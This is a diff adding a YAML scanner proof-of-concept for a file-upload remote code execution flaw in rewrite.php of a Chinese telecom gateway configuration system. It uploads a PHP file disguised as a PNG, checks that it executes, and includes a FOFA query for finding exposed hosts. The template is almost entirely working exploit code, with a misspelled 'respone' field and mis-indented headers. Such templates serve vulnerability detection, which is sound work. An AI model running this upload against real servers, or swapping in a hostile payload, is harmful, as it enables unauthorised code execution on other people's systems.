@@ -1,0 +1,33 @@
+```
+name: poc-yaml-dx-gateway-config-manage-fileupload
+set:
+  filename: randomLowercase(4)
+  r2: randomInt(40000, 44800)
+  r3: randomInt(40000, 44800)
+rules:
+  - method: POST
+    path: "/manager/teletext/material/rewrite.php"
+    headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
+    body: |-
+        ------WebKitFormBoundaryOKldnDPT
+        Content-Disposition: form-data; name="tmp_name"; filename="{{filename}}.php"
+        Content-Type: image/png
+
+        <?php echo"{{r2*r3}}";unlink(__FILE__);?>
+        ------WebKitFormBoundaryOKldnDPT
+        Content-Disposition: form-data; name="uploadtime"
+
+        ------WebKitFormBoundaryOKldnDPT--
+    expression: |
+      response.status == 200
+  - method: GET
+    path: "/xmedia/material/{{filename}}.php"
+    expression: |
+      response.body.bcontains(bytes(string(r2*r3))) && respone.status == 200
+detail:
+  author: yishuizhe
+  name: 电信网关配置管理系统 rewrite.php 文件上传致RCE
+  fofa-query: body="img/login_bg3.png" && body="系统登录"
+```
